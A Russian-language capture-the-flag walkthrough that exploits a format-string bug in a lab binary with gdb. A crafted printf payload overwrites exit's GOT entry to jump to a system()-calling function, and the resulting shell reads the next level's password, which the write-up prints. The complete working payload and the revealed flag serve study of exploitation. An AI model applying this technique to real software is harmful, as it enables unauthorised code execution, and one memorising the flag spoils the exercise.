gdb ./level5
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	and    $0xfffffff0,%esp
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave
   0x08048510 <+12>:	ret
End of assembler dump.

Вызывается только функция <n>. Посмотрим что в ней

(gdb) disas n
    Dump of assembler code for function n:
        0x080484c2 <+0>:	push   %ebp
        0x080484c3 <+1>:	mov    %esp,%ebp
        0x080484c5 <+3>:	sub    $0x218,%esp
        0x080484cb <+9>:	mov    0x8049848,%eax
        0x080484d0 <+14>:	mov    %eax,0x8(%esp)
        0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
        0x080484dc <+26>:	lea    -0x208(%ebp),%eax
        0x080484e2 <+32>:	mov    %eax,(%esp)
        0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
        0x080484ea <+40>:	lea    -0x208(%ebp),%eax
        0x080484f0 <+46>:	mov    %eax,(%esp)
        0x080484f3 <+49>:	call   0x8048380 <printf@plt>
        0x080484f8 <+54>:	movl   $0x1,(%esp)
        0x080484ff <+61>:	call   0x80483d0 <exit@plt>
    End of assembler dump.

На 49 строке есть <printf>, 
Так как у нас опять есть вызов <printf>, то мы можем его как-то использовать
После него на 61 строке есть вызов <exit>, который переносит нас в другую область: *0x8049838
Это видно здесь
        (gdb) disas 0x80483d0
        Dump of assembler code for function exit@plt:
        0x080483d0 <+0>:	jmp    *0x8049838 
        0x080483d6 <+6>:	push   $0x28
        0x080483db <+11>:	jmp    0x8048370
        End of assembler dump.

но не видно где выполняется bin/sh
Посмотрим какие есть функции

(gdb) i func

        All defined functions:

        Non-debugging symbols:
        ---
        0x08048420  __do_global_dtors_aux
        0x08048480  frame_dummy
        0x080484a4  o
        0x080484c2  n
        0x08048504  main
        0x08048520  __libc_csu_init
        0x08048590  __libc_csu_fini
        0x08048592  __i686.get_pc_thunk.bx
        0x080485a0  __do_global_ctors_aux
        0x080485cc  _fini

Есть еще одна функция <o>

(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x18,%esp
   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	movl   $0x1,(%esp)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.

Супер, есть <system@plt>, значит нам нужно перейти к функции <o>
Мы можем использовать <exit> и подменить область в которую он прыгает, на функцию <o>

(gdb) p 0x080484a4 <- переведём в decimal адрес ф-ции o
$1 = 134513828

Проверим позицию входного аргумента у <printf>

./level5
0000 %p %p %p %p %p %p
0000 0x200 0xb7fd1ac0 0xb7ff37d0 0x30303030 0x20702520 0x25207025

Аргумент опять на 4 месте
Составляем форматную строку: 
сначала адрес переменной куда прыгает (4 символа), потом {decimal адрес ф-ции o - 4}, чтобы получилась нужная длина,
которую %n положит в нужную нам переменную

echo -e "\x38\x98\x04\x08%134513824d%4\$n" > /tmp/level5

cat /tmp/level5 - | ./level5

cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

su level6



